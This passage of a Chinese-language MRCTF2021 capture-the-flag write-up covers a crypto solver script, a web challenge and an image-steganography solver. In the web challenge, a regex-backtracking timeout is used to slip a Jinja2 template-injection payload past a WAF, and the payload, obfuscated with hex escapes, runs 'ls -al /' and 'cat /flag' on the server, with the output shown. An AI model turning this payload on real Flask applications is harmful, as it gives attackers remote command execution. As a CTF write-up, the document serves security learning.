1] # 正负号 idx_result[t] = [r, -1] idx_list.remove(r) idx_list.remove(t) break return idx_result def main(): proof_of_work(sh) sh.recvuntil(\"question~\") sh.recvuntil(\"N = \") tmp = sh.recvuntil(\"]\") tmp = tmp.decode('utf-8').strip() tmp = eval(tmp) print('====================') print(tmp) print(\"flag len:\", len(tmp) // 8) # 28 bits N = tmp length = len(N) print(length) idx_history = [] flag_bits = \"\" for i in range(length): idx = generate_idx(length) while idx in idx_history: idx = generate_idx(length) idx_history.append(idx) for j in range(length): try: t = N[idx[j][0]] * idx[j][1] except IndexError: print(idx, i, j) raise Exception payload = str(t) sh.sendline(payload) sh.recvuntil('your gift: ') x = sh.recv(1).decode('utf-8') print(f\"=======&gt; flag_{i+1}: {x}\") flag_bits += x with open('flag.txt', 'a', encoding='utf-8') as f: f.write(f\"{i+1}: {x} \") f.write(f\"{flag_bits}\\n\") print(flag_bits) # flag_bits = \"1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101\" flag_int = int(flag_bits, 2) flag = long_to_bytes(flag_int) print(\"=====&gt; flag:\", flag) if __name__ == '__main__': main() 最后得到的 flag bits 为 1001101010100100100001101010100010001100111101101100101010000000011001101111001010111110110001101101000001100110110001101101011010111110011000101101110010111110111000001110010001100000110001001101100001100110110110101111101 转换为 bytes MRCTF{e@3y_ch3ck_1n_pr0bl3m} Webwwwafed_app I bought a WAF for my vulnerable app, and I think it’s unbreakable now. node.mrctf.fun:15000 /waf 源码： import re,sys import timeout_decorator @timeout_decorator.timeout(5) def waf(url): # only xxx.yy-yy.zzz.mrctf.fun allow pat = r'^(([0-9a-z]|-)+|[0-9a-z]\\.)+(mrctf\\.fun)$' if re.match(pat,url) is None: print(\"BLOCK\",end='') # 拦截 else: print(\"PASS\",end='') # 不拦截 if __name__ == \"__main__\": try: waf(sys.argv[1]) except: print(\"PASS\",end='') 可以注意到如果超时了的话 except 里也是 PASS。 另外发现 server 是 gunicorn，源码也是 python，盲猜是 flask 模板注入。 发现貌似可以正则回溯超时+空行绕过。 xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun {{161*1651}} eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19 GET /api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3sxNjEqMTY1MX19 返回 读 / {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"ls -al /\")[\"read\"]()}} http://node.mrctf.fun:15000/api/spider/eGFkc2ZhZHNmYWRzZmFzLmRmYXNkZi1hc2RmLWFkc2ZhZHNmLmxhamRzLi05MjM0MTAxMmRzZmFzZjguNS5tcmN0Zi5mdW4Ke3siIlsiXHg1Zlx4NWZjbGEiInNzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZiYSIic2VceDVmXHg1ZiJdWyJceDVmXHg1ZnN1YmNsYSIic3Nlc1x4NWZceDVmIl0oKVs0MDhdWyJceDVmXHg1ZmluIiJpdFx4NWZceDVmIl1bIlx4NWZceDVmZ2xvIiJiYWxzXHg1Zlx4NWYiXVsiXHg1Zlx4NWZidWlsdGluc1x4NWZceDVmIl1bIlx4NWZceDVmaW1wb3J0XHg1Zlx4NWYiXSgib3MiKVsicG9wZW4iXSgibHMgLWFsIC8iKVsicmVhZCJdKCl9fQ== 访问'xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun total 88 drwxr-xr-x 1 root root 4096 Apr 11 11:55 . drwxr-xr-x 1 root root 4096 Apr 11 11:55 .. -rwxr-xr-x 1 root root 0 Apr 11 10:05 .dockerenv dr-xr-xr-x 1 root root 4096 Apr 11 10:05 app drwxr-xr-x 1 root root 4096 Mar 30 23:04 bin drwxr-xr-x 2 root root 4096 Mar 19 23:44 boot drwxr-xr-x 5 root root 340 Apr 11 10:05 dev drwxr-xr-x 1 root root 4096 Apr 11 10:05 etc -rw-r--r-- 1 root root 2 Apr 11 11:55 flag drwxr-xr-x 2 root root 4096 Mar 19 23:44 home drwxr-xr-x 1 root root 4096 Mar 30 23:04 lib drwxr-xr-x 2 root root 4096 Mar 29 00:00 lib64 drwxr-xr-x 2 root root 4096 Mar 29 00:00 media drwxr-xr-x 2 root root 4096 Mar 29 00:00 mnt drwxr-xr-x 2 root root 4096 Mar 29 00:00 opt dr-xr-xr-x 507 root root 0 Apr 11 10:05 proc drwx------ 1 root root 4096 Apr 11 10:05 root drwxr-xr-x 3 root root 4096 Mar 29 00:00 run drwxr-xr-x 1 root root 4096 Mar 30 23:03 sbin drwxr-xr-x 2 root root 4096 Mar 29 00:00 srv dr-xr-xr-x 13 root root 0 Apr 11 10:05 sys drwxrwxrwt 1 root root 4096 Apr 11 10:05 tmp drwxr-xr-x 1 root root 4096 Mar 29 00:00 usr drwxr-xr-x 1 root root 4096 Mar 29 00:00 var '失败！ whoami ==&gt; root 读 flag xadsfadsfadsfas.dfasdf-asdf-adsfadsf.lajds.-92341012dsfasf8.5.mrctf.fun {{\"\"[\"\\x5f\\x5fcla\"\"ss\\x5f\\x5f\"][\"\\x5f\\x5fba\"\"se\\x5f\\x5f\"][\"\\x5f\\x5fsubcla\"\"sses\\x5f\\x5f\"]()[408][\"\\x5f\\x5fin\"\"it\\x5f\\x5f\"][\"\\x5f\\x5fglo\"\"bals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"cat /flag\")[\"read\"]()}} MRCTF{eeeeeeeeeeeeeeeeeeeeez_NFA-WAF_8ypaS5!} 读一下题目源码 start.py from flask import Flask, request,render_template,url_for from jinja2 import Template import requests,base64,shlex,os app = Flask(__name__) @app.route(\"/\") def index(): return render_template('index.html') @app.route(\"/waf\") def wafsource(): return open(\"waf.py\").read() @app.route(\"/source\") def appsource(): return open(__file__).read() @app.route(\"/api/spider/&lt;url&gt;\") def spider(url): url = base64.b64decode(url).decode('utf-8') safeurl = shlex.quote(url) block = os.popen(\"python3 waf.py \" + safeurl).read() if block == \"PASS\": try: req = requests.get(\"http://\"+url,timeout=5) return Template(\"访问成功!网页返回了{}字节数据\".format(len(req.text))).render() except: return Template(\"访问{}失败！\".format(safeurl)).render() else: return Template(\"WAF已拦截，请不要乱输入参数！\").render() if __name__ == \"__main__\": app.run(host=\"0.0.0.0\",port=5000,debug=True) 啊 有 /source 源码泄露的啊（（下次做题先扫一扫好了 讲个笑话，这题打的时候最开始还读到有 flag 的，然后发现内容是 1。 再一读发现没东西了。再一看根目录，flag 你去哪了…… 问了问出题人 噢对，root 权限 xswl！ Extensive Reading: PHP利用PCRE回溯次数限制绕过某些安全限制 ez_larave1 http://node.mrctf.fun:10012/ https://drive.buptmerak.cn/s/afGBmP8zjg47orG 根据修改时间，看一看最近修改的文件。 Laravel 版本用的是 5.7.29，查了查发现有个 RCE。 然后这里的 PendingCommand.php 把 __destruct() 里的 run 给注释掉了。 之后再参考下面的几篇 Laravel入坑之CVE-2019-9081复现分析 Laravel 5.7反序列化漏洞(CVE-2019-9081+2020第五空间题解) 找个能执行代码的地方，执行这个 run 就好。 （后面再来复现，咕咕咕 Miscplane This plane cannot fly~~~ Hint: plane:721x-402y+9110z-1197483=0 ![(153, 15, 120),(51, 104, 132),(229, 38, 115)](CTF_2021MRCTF/(153, 15, 120),(51, 104, 132),(229, 38, 115).png) 图片好花啊，看了一下发现在 blue plane 第7层存在奇怪的东西。 然而提取出来啥也看不出。 根据题目 hint，估计是要根据 721x-402y+9110z-1197483=0 这个空间平面来划分图像空间，一半是黑，一半是白。 按照题目本意的话，应该是需要根据 (153, 15, 120), (51, 104, 132), (229, 38, 115) 这三个坐标来求出所给的平面的，不过即使给出来了当时还是没整出来（（ 写个脚本。 # coding: utf-8 \"\"\" MRCTF2021 Misc plane MiaoTony \"\"\" from PIL import Image im = Image.open('(153, 15, 120),(51, 104, 132),(229, 38, 115).png') rgb_im = im.convert('RGB') print(rgb_im.size) # (400, 400) width = rgb_im.width height = rgb_im.height im2 = Image.new('RGB', rgb_im.size) for j in range(height): for i in range(width): r, g, b = rgb_im.getpixel((i, j)) if 721*r-402*g+9110*b-1197483 &gt; 0: im2.putpixel((i, j), (255, 255, 255)) # im2.show() # im2.save('test1.png') 得到一张图片，和 blue plane 7 很类似。（就是模仿 blue plane 7 确定的黑白） 放大来看是这样的。 图片 纵向方向上 可以发现分了很多层，猜想是把二进制的 ASCII 编码到了黑白像素中了。 根据最右边纵向可以估计是 10000110，不对，反过来，01100001，正好是 ASCII 里的 a。于是需要上下反过来解码。 而且还是从上到下，一列有50个字符，每个字符从上到下是低位到高位。 （复现的时候其实这里试了好多次才发现的…… 然后写个脚本解码吧。（接上面的） data = '' for i in range(width): cnt = 0 x = '' for j in range(height): if im2.getpixel((i, j))[0] == 0: x = '1' + x else: x = '0' + x cnt += 1 if cnt % 8 == 0: # print(x) ch = chr(int(x, 2)) # print(ch) data += ch x = '' print(data) with open('result.txt', 'w', encoding='utf-8') as f: f.write(data) 处理得到 Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSV01WbDNXa1JTVjAxV2JETlhhMUpUVmpBeFYySkVUbGhoTVVwVVZtcEJlRll5U2tWVWJHaG9UVlZ3VlZadGNFSmxSbGw1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GU214U2JHdzFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1UyMTRVMkpIZHpGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMVV5TVRSVk1rcElaSHBHVjFaRmIzZFdha1poVjBaT2NtRkhhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY1ZadGRHRk5SbFowWlVaT1ZXSlZjRWRaTUZaM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOc2NFaGpSbEpUVmxoQ1dsWXhXbE5TTWxGNVVtdGthbEp0VWxsWmJGWmhZMnhXY1ZKdFJsUlNiR3cxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFhXSEJIVkRKU1YxWnVVbWhTYXpWeldXeG9iMWRHV25STlNHUnNVakJzTkZVeWRHdFhSMHBJVld4c1dtSkhhRlJXTUZwVFZqSkdSbFJzVG1sU2JrSmFWMnhXWVZReFdsaFRiRnBZVmtWd1YxbHJXa3RTUmxweFVWaG9hMVpzV2pGV01uaGhZVWRGZUdOR2JGaGhNVnBvVmtSS1QyTXlUa1phUjJoVFRXNW9WVlpHWTNoaU1rbDRWMWhvV0dKRk5WVlVWM1J6VGtaVmVXUkhkRmhTTUhCSlZsZDRjMWR0U2toaFJsSlhUVVp3VkZacVNrZFNiRkp6Vkcxc1UySnJTbUZXTW5oWFdWWlJlRmRzYUZSaVJuQlpWbXRXZDFZeGJISlhhM1JUVW14d2VGVldhRzloTVZwelYycEdWMDF1YUdoWlZXUkdaVWRPUjJKR2FHaE5WbkJ2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5V1ZscEhXVE5vYVUxcmJEUldNV2h2VjBkS1JrNVdWbFZXTTFKNlZHdGFWbVZYVWtoa1JtaFRUVWhDU2xac1pEUmpNV1IwVTJ0a1dHSlhhR0ZVVnpWdlYwWnJlRmRyWkZkV2EzQjZWa2R6TVZkR1NsWmpSV3hYWWxoQ1RGUnJXbEpsUm1SellVWlNhRTFzU25oV1Z6QjRUa2RHUjFaWVpHaFNWVFZWVlcxNGQyVkdWblJOVldSV1RXdHdWMWxyVW1GWFIwVjRZMGhLV2xaWFVrZGFWV1JQVTBVNVYxcEhhR2hOU0VKMlZtMTBVMU14VVhsVmEyUlVZbXR3YjFWcVNtOVdSbXhaWTBaa2JHSkhVbGxhVldNMVlWVXhXRlZyYUZkTmFsWlVWa2Q0YTFOR1ZuTlhiRlpYWWtoQ1NWWkdVa2RWTVZwMFVtdG9VRll5YUhCVmJHaERUbXhrVlZGdFJtcE5WMUl3VlRKMGExZEhTbGhoUjBaVlZucFdkbFl3V25KbFJtUnlXa1prVjJFelFqWldhMlI2VFZaWmQwMVdXbWxsYTFwWVdXeG9RMU14VWxkYVJWcHNVbTFTV2xkclZURldNVnB6WTBaV1dGWXpVbkpXVkVaelZqRldjMWRzYUdsV1ZuQlFWa1phWVdReVZrZFdXR3hyVWtWS1dGUldXbmRsVm10M1YyNWtXRkl3VmpSWk1GSlBWakpHY2xkcmVGZGhhM0JRVlRGa1MxSXhjRWRhUms1WFYwVktNbFp0TVRCVk1VMTRWVmhzVlZkSGVGWlpWRVozWWpGV2NWUnJUbGRTYlhoYVdUQmFhMWRHV25OalJteGFUVVpWTVZsV1ZYaGpiVXBGVld4a1RsWXlhREpXTVZwaFV6RkplRlJ1VG1GU2JGcFlXV3RhZDA1c1draGxSMFphVm0xU1IxUnNXbUZWUmxwMFlVWlNWVlpYYUVSVk1uaGhZekZ3UlZWdGNFNVdNVWwzVmxSS01HRXhaRWhUYkdob1VqQmFWbFp0ZUhkTk1XeFdWMjVrVTJKSVFraFdSM2hUVlRKRmVsRnFWbGRTTTJob1ZrUktSMVl4VG5WVmJFSlhVbFJXV1ZaR1l6RmlNV1JIWWtoR1ZHRXhjSE5WYlRGVFYyeGtjbFpVUmxkTlZuQjZXVEJhVjFkR1dYcFZia3BYVmtWYWVsWnFSbGRqTVdSellVZHNWMVp1UWxGV2ExcGhXVmRSZVZaclpGZFhSM2h5Vld0V1MxZEdVbGRYYm1Sc1ZtMTBNMVl5Tld0WFJrbDNWbXBTV2sxR1NsQldha3BIWTJ4a2NtVkdaR2hoTTBKUlZsUkdhMU14U1hoalJXUmhVbXMxV0ZZd1ZrdE5iRnAwVFZSQ1ZrMVZNVFJXVm1oelZsWmtTR1ZHV2xwV1JWb3pXV3BHVjJOV1VuSlViR1JUWWxob05WWnRNREZoTVZsNFYyNU9hbEpGU21oV2JHUk9UVlphV0dNemFGaFNiRm94V1RCYWExUnNXWGxoUkVwWFlXdEtjbFY2Umt0amF6VlhXa1phYVZKc2NGbFdSbEpMWWpGT1YxZHJhR3hTTUZwWVZGZDRTMU5XV2xoa1J6bG9UVlZzTlZsVmFFTldiVXBJWVVWT1lWSkZXbWhaZWtaM1VsWldkR05GTlZkTlZXd3pWbXhTUzAxSFJYaGFSV2hVWWtkb2IxVnFRbUZXYkZwMFpVaGtUazFYZUZkV01qVnJWVEpLU1ZGcmFGZFNNMmhVVmxSS1JtVnNSbkZXYkdSVFRUSm9iMVpyVWt0U01WbDRWRzVXVm1KRlNsaFZiRkpYVjFaYVIxbDZSbWxOVjFKSVdXdG9SMVpIUlhoalNFNVdZbFJHVkZZeWVHdGpiRnBWVW14a1RsWnVRalpYVkVKaFZqRmtSMWRZY0ZaaWEzQllWbXRXWVdWc1duRlNiR1JxVFZkU2VsbFZaSE5XTVZwMVVXeEdWMkV4Y0doWFZtUlNaVlphY2xwR1pGaFNNMmg1VmxkMFYxTXhaRWRWYkdSWVltMVNjMVp0TVRCTk1WbDVUbGQwV0ZKcmJETldiWEJUVjJzeFIxTnNRbGRoYTNCSVdUSjRhMk50VmtkYVJUVlhZbXRLU2xZeFVrcGxSazE0VTFob2FsSlhhSEJWYlRGdlZrWmFjMkZGVGxSTlZuQXdWRlpTUTFack1WWk5WRkpYWWtkb2RsWXdXbXRUUjBaSFlVWndhVmRIYUc5V2JURTBZekpOZUdORmFGQldiVkpVV1d0V2QxZHNXa2hsUjNCUFZteHNORll5TlU5aGJFcFlZVVpzVjJFeFZYaGFSM2h6VmpGYVdXRkhjR2xXV0VKSFZteGtOR0V4VW5OWFdHeG9Va1Z3V0ZsWGRFdGpiRlkyVW10MGFtRjZWbGhYYTFwcllWWktjMk5HYkZkU2JFcElWWHBCTVdNeFpISmhSM1JUVFVad1dWZFhlR0ZaVm1SWFYyeG9hMUo2Ykc5VVZsWjNUVVpzVmxkc1RsZFdiSEJaV1ZWV1UxWnJNWFZoUjJoYVpXdGFNMVZzV2xka1IwNUdUbFprVGxaWGQzcFdiWGhUVXpBeFNGSllhR0ZTVjJoVldXdGtiMkl4Vm5GUmJVWlhZa1p3TUZwVmFHdFVhekZZWlVaa1YwMXFWbkpXVkVwTFUxWkdjbHBHVms1V2JGVjRWMVphWVZNeFpGZFNiR3hoVW0xb2NGVnRlSGRpTVZweVZXdDBVMDFXYkRSV1Z6VkxWMGRLUjFOdVFsZGlSbkF6VmpGYVlWSXhiRFpTYld4T1ZqRktTVmRYZEc5U01WcElVbGhvYWxORk5WZFpiRkpIVmtaWmVXVkhkR3BpUm5CV1ZXMTRhMVJzV25WUmFscFlWa1ZLYUZacVJtdFNNV1JaWTBaYWFXRXpRbGxXYlhSWFdWZFdjMWR1UmxOaVIxSnhWRlprVTJWc2JGWmFTRTVYVFZad01WVlhlRWRXTWtWNFkwZG9XRlp0VWxOYVZscGhZMnh3UjFwR2FGTk5NbWcxVm14a01GWXhUWGhhUldSV1lrZFNXVmx0TVZOak1WcDBUVlJDVGsxV2JEVlViR1F3VjBaS2NtSkVUbGRpV0VKVVZqSnplRkl4VG5OUmJHUk9ZV3RhU0Zkc1dtRldNazV6WTBWb1UySkhVazlVVnpGdlUyeFplRlZyY0d4U2F6RTBWVEZvYjJGc1NsaGhTRUpXWWxSR2RsWnJXbUZqTWtaR1ZHeFNUbFp1UVhkV1JscFRVVEZhY2sxV1drNVdSa3BZV1d0a2IyUnNXWGRYYlhSVVVqQmFTRmxyV25kaFZtUklZVWM1VjJKVVJUQlpla3BQWXpKT1JtRkdRbGROTUVwVlYxZDBiMUV3TlVkWGJGWlVWMGRTVUZacVFuZFRWbFY1WkVjNVYySlZjRWxhVldSdlZqSktTRlZyT1ZWV2JIQjZWbXBHWVZkWFJraGpSMnhYVjBWS1NGWnRlR3RPUjBWNFZXNU9XRmRIZUc5VmExWjNWMFpTVjFkdVpHaFNiRmt5VlcxMGQySkdTbk5UYWtaWFVucEdTRlpVU2t0U01rNUhZa1pvVjAweFNtOVhhMUpDVFZkTmVGcElTbWhTTTJoVVZGVmFkMkZHV25STlNHaFdUVlUxV0ZZeU5WTmhNVW8yWWtjNVZWWnNXbnBVYkZwelZtMUdSbFJzWkdsV1dFSktWMVpXVjFReGJGZFRhMXBZWW10d1dGbFhkR0ZoUm5CR1ZsUldWMDFXY0hsVWJGcHJZVmRGZDFkWWNGZGlXR2h4V2tSQmVGWXhVbGxoUmxwWVVqSm9XbGRYTVhwTlZscFhZa2hLWVZKNmJGaFphMXAzWld4WmVVNVhkRlZoZWtaWVdUQm9jMVl3TVhGU2EyaGFWak5vYUZreU1VOVNWa1owVW14T1YwMVZXWHBXYlhoVFV6RktkRlp1VGxOaVIzaG9WVzB4YjJOR1ZuUmxTR1JwVFZkU1dGWlhkREJWTURGWFlrUlNWMUo2VmxoV2JHUkxWMGRHUms5V1ZsZGxhMW95Vm1wR1lXRXhXWGhXYmtwaFVqTlNUMWxVUm5kVFZscHhVMnBTVjAxV1ZqVlZNblJyWVd4T1JrNVdaRnBpUmtwSVZtdGFVMVl4WkhOWGJYaFhUVVJSZVZaWE1UUmlNVlY1VWxod1VtSlZXbGhXYlRGT1pVWnNjVkpzY0d4U2JWSjRWako0UzJGSFNrWmpSMmhZVm0xUmQxZFdXbk5XTWs1SFYyeG9hVkl4U25oV1JtUXdXVlpKZUZWWWFGaGlXRkp2VldwR1lXVnNXWGxqUjBaWFRVUkdXVlpXYUd0WFJscDBWV3hPWVZac2NHaFpNbmgzVWpGd1IyRkdUazVOYldjeFZtMTRhMDFHV1hoVVdHaGhVbGRTVjFsclpGTlhWbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1YxRjNWakJhU21ReVRrWmhSbkJPVW01Q01sWnFTbnBsUms1SFZtNVdXR0pIVWs5WlYzUmhVMFprYzFkdFJsZE5helY2V1RCV2IxVXlTa2hWYkdoVlZteGFNMVpYZUdGak1WWnlXa2RvVGxaVVJUQldWRVp2WWpKR2MxTnNhRlppVjJoWFdXeG9UbVZHV1hkWGJIQnJUVlp3ZVZwRlZURmhWa3AxVVZoa1YxSnNjRlJWVkVaaFkyc3hWMWRyTlZkU2EzQlpWbTB3ZUdJeVZuTlhiazVZWWxoU1ZWVnFSbUZUUmxsNVpVaGtWMDFWY0ZoWmFrNTNWMFpaZWxGcmFGZGhhM0JRVm1wR1YyUldUbk5XYld4VFRWVndWbFl4WkRSaU1rbDNUbFprV0dKc1NrOVZhMVpoWWpGU1YxZHVUazlTYkd3MVZHeFZOV0ZIU2taalJXUldUV3BHZGxacVNrdFRSbFp5VDFaV1YySklRbTlXYWtKclZHMVdkRkpyWkdoU2F6VndWVzB3TlU1R1dYaFZhMDVhVmpCV05GWlhOVTlYUm1SSVpVYzVWbUV4V2pOV01GcHpWMGRTUm1SSGNHbFNiR3Q1VmxjeE1FMUhSblJTYWxwWFlrZG9XVmxVUm5kaFJteFhWMnQwYWsxck5VaFphMXByVlRKS1JtTkZNVmhXTTBKSVZrUkdXbVZHY0VsVGJXaFRUVEpvVlZaR1ZtRmtNV1JYVjJ0a1lWSkdTbFZVVmxVeFYwWlplV1ZIT1doTlZXOHlXV3RqTlZaV1duTlhhazVWVmxad2VsWnRlR3RqTVZKeldrWmthVk5GU2xwV01WSkRZVEZKZUZkc1pGaGlhelZ4VldwS2IxbFdjRmhrUjBaT1RWWmFlbFl5ZUd0aE1VbDNUbFZrVldKR2NISldSM2hoVjBkUmVtTkdaR2xYUjJoVlZsaHdRbVZHVGtkVWJHeHBVbXMxYjFSWGVFdFdiR1JZVFZod1RsWnNjRmhaYTJoTFdWWktObUpHYUZwaE1YQXpXbGQ0V21WVk5WaGtSbFpvWld0YVdWZFVRbTlqTVZsM1RWaEdVMkV5YUdGV2FrNXZZVVpyZVUxVk9WTldhMW93VlcxNFQxWXdNVlpYV0hCWFlsaG9WRlY2Umt0a1JscDFWR3hPYVZJemFHOVdWekI0WWpKT1IxWnVVbXhUUjFKd1ZGWmtVMWRHV2xoa1JFSldUVVJHV0ZsclVsTldNVW8yVm14b1YySkhVa3hXTUdSSFVtczVWMVpzWkd4aE1XOTVWbTF3UjFsWFJYaFhXR2hYWW10d2FGVnFUbE5VTVd4VlVtNWtWRlpzY0hoVk1uQlRWakF4VjFacVZsWk5ibEp5V1ZkNFQxSnJOVmRhUm5CcFVtdHdTVlp0ZEdGVk1WbDRXa2hPV0dKWWFGaFVWVkpTWlZaYVdFMVVVbWhOVmtwNlZqSTFWMVZ0Um5OalJteFhZVEZhVEZsVldtRmpWa3AwWkVaT1RsWXhTWGhXYTJRMFZUSkdSazFZVW1oU2VteFlWbXBPVTFkR1pGZFhiazVYVFdzMVNGWXlNVWRWTVdSSFUyeGFWMkpVUmpaVVZtUlhZekpLUjFkdFJsTmxiWGhYVjFab2QxSXhXWGhoTTJSWVlsVmFXRlJYZEhkVFZscElZMFpPVjFZd1ZqVldWM2hQV1ZaYWMyTkhhRnBOYm1nelZXcEdkMUl5UmtkVWF6Vk9ZbGRqZUZadE1UUmhNbEY0VWxob2FWSnRhRlpaVkVwVFYwWnNkR1ZGZEdwTlZsWXpWMnRhVDJGck1WaGxTR3hYVFc1b2NsWkVSbUZrVmtaeldrWndWMVl4UmpOV2FrSmhVMjFSZVZScldtaFNia0pQVlcwMVEwMXNXbkZUYm5Cc1VtczFTVlZ0ZEdGaVJrcDBWVzA1V2xaRldqTlpha1poVjBVeFZWVnRhRTVoZWxWM1ZtMHhNR0V4YkZkVGJGWlhZa2RvWVZsc2FGTlVSbFY1WlVad2JGSnNXbmxaTUdRMFZUSkdObEpVUWxkV1JWcDJXV3BLUjJNeFRuTmhSbHBwVmpKb1dGZFhkR0ZUTVdSSFYydFdVMkpIVW5GVVYzUmhVakZhU0dWR1RsVmlSbkF4VlZab2ExWXhTbk5qUmxKV1ZrVmFhRmt5YzNoV01XUnlUbFprVTJFelFscFdNV1F3WVRKSmVWVnVUbGhYUjFKWldXeG9VMVpXVm5GUmJVWlVVbTE0VjFZeU5XdGhSbHAwVld0c1dsWlhUVEZXYWtwTFZsWktWVkZzY0d4aE0wSlFWMnhXYTFReFNuUlNhMlJTWWtkU2NGWnRkSGRXYkZsNFdrUkNWMDFzUmpSWGEyaFBWMGRGZVZWc2JGcGlSMmhFVmxWYVlXTldSblZhUmxKWFlrWlpNVmRyVm1wT1ZsbDVVMnhhYWxKWGVHaFdiR1JUWkd4YWNWTnJkRlJTYkZwNVZERmFWMVl5U2tsUmFscFhZbGhDU0ZkV1dtdFhSa3B5V2tkb1UyRjZWbmRXVnpCM1RsVTFSMWRZYUZaaE1EVmhWbXBDVjA1R1dsaE9WVGxZVW0xU1NWcFZZelZXYlVWNFYycE9WMDFHY0hwV01HUlRVbTFTU0dOSGJGTmlSM1ExVm14amQyVkZNVWRYV0dST1ZtMVNjVlZyVm1GV01WSllUbGM1VTFKc2NIaFZNblF3VmtaYWNsZHFSbGhoTVhCeVdWWmFhMUl4VG5OaVJtUnBWa1ZKTUZac1kzaFdNVWw0WTBWc1YySkZOWEJWYkdoRFpERmFkR1ZIUm10TmExcElWakkxVTFSc1drWlRia1pWVmxaS1dGWXdXbUZrUlRWWFZHMW9UbFpYT0hsWFYzUmhZVEZhZEZOc2JHaFRTRUpXV1d0YWQyVnNXblJOVldSVFlrWktlbGRyWkhOV01XUkdVMnQwVjAxV2NGaFdha1pTWlVkS1IxcEdVbWhOV0VKYVYxY3hNR1F4WkVkaVJtaHJVakJhYjFWdE5VTlNNVnB6Vld4a1YwMUVSbGhaTUdoelZsZEtSMk5JU2xwV2JWSkhXa1JHYTFkWFRrZGFSMnhZVWpKb05GWXlkRk5SYlZaSFYxaG9WbUpIZUc5VmJURnZZakZTV0UxWE9WZGlSMUpaV2tWa01HRlZNWEppUkZKWFlsUldTRlpYTVV0V2JHUnpZVVp3YUUxWVFYcFdSbFpoWkRGYWRGSnJhR3RTYkZwdldsZDBZVmRXWkZWUmJUbHFUVlpzTTFSV2FFZFZNa1Y1WVVkR1YyRnJOWFpaVlZweVpWZE9ObEpzYUZkTlNFSkpWMVpXYTJJeFVuTmFSVnBVWWtWd1dGUldXbmRoUm1SWFYyczFiRlpzU2pGV1YzaFhZVVV4VjJOR2NGaFdNMUp5VmxSS1NtVkdWbk5oUjNCc1lUQndVRlpYTUhoVk1XUnpZVE5rVjJKWVVsaFVWM1IzVjBaWmVXVkhPVmROVlc4eVZtMTRiMVl5UlhsVmEzaFdZV3RhVUZwR1drZGpNWEJJWWtaT2FXRXdXVEpXYlRGM1VqRnNWMkpHWkZSWFIyaHdWV3RhZDFaR2JITmFSRkpWVFZad2VGVnRkREJXUmxwellrUldZVkpYVWtoWlZWVjRWMFpXY21KR1drNWliRXB2VjFaa05GUXhTbkpPVm1SaFVtNUNjRlZ0ZEhkVFZscDBaRWRHYTAxWFVrbFdiWFJ6VmxkS1NGVnVRbFpoYTFwTVZHMTRZV05zYTNwaFIyeE9WbXhaTUZacVNqQlpWbVJJVTJ4YVdHSkhhRmhaYkZKSFZERndWbGR1VG1wV2EzQjZXVEJrTkZVeVNsZFRiVVpZVmtWS2NsbHFSbUZTTVU1ellrWkthVll5YUZwV2JUQjRWVzFSZUZwR1pHRlNWR3h4VkZaYWQwMVdWblJsUlRsb1ZtdHNORlV5Tlc5V01VcDBWVmhrV0Zac2NFdGFWVnBYVjFkR1IyRkhiRmhTYTNCYVZtdGFZVmxYVVhoVWEyUllWMGQ0Y1ZWc2FGTlhSbEpZWkVoa1ZGWnNjRWxaTUZwUFZqRlpkMVpxVmxkV00yaFFWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVVsNVVtdGtWV0Y2Vms5WmJHUnFaVVphZEUxVVVtaE5iRVkwVmxab2IxWXhaRWhsUmxaWFRVZFNkbGt3V2xaa01WcFZVbXhvVTJKWVozZFdSbHBoVkRGa1IxTnVUbFJpUjJoWVZGZHdWMk5zV2tobFJYUnJVakZLUmxaSGVHOWhSVEZYWTBoc1YyRnJTbWhWTWpGU1pWWlNjbGR0YUZOaWEwcFFWbGN3TVZFd01YTlhia1pVWW01Q2MxVnRjekZUVmxaMFpFZEdhVkpyY0RCV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQyTldWblJoUlRWb1pXeFdNMVp0TUhoTlIwVjRZa1prVkZkSGVHOVZibkJ6Vm14YWNsWnJkRlZTYkhCWldsVmtSMkZyTVZsUmEzQllZVEZ3VUZaSGVGcGxiVVpIWTBaa2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU2JIQndWbXRrTkZkR1pGaGxSemxwVFZaS1NGWXlOVXRYUjBwV1YyNUdWVll6VW1oVmFrWmhVMGRXUjFSc1ZtbFNia0Y0Vmxaa2QxVXhXWGhYYWxwU1lXeEtWMWxYZEdGaFJtdDVZek5vVjAxWFVubFViRnByVlRKRmVsRnNjRmROVjFGM1dWUktTbV